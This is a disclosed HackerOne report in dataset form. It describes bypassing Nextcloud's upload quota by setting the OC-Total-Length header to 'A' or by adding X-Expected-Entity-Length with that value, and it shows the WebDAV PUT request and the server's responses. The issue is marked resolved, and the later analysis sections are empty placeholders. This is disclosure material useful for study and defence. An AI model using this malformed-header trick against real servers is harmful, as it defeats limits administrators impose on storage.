---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '173622'
original_report_id: '173622'
title: Bypassing quota limit
weakness: Privilege Escalation
team_handle: nextcloud
created_at: '2016-10-03T10:19:05.513Z'
disclosed_at: '2017-03-10T19:10:11.187Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- privilege-escalation
---

# Bypassing quota limit

## Metadata

- HackerOne Report ID: 173622
- Weakness: Privilege Escalation
- Program: nextcloud
- Disclosed At: 2017-03-10T19:10:11.187Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi
an user can upload files despite having a limited quota by changing value of  "OC-Total-Length" in header  to "A" or adding "X-Expected-Entity-Length" in header with "A" value

in normal insuffisant storage we have:

PUT /remote.php/webdav/a.jpg HTTP/1.1
Content-Type: application/octet-stream
OC-Async: 1
OC-Chunk-Size: 10000000
OC-Total-Length: 200

Response
HTTP/1.1 507 Insufficient Storage

after changing OC-Total-Length: A , the file is created and the response is:

HTTP/1.1 201 Created

the user can largely exceed its quota and bypass admin restriction
affected version:  Latest stable version: 10.0.1

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
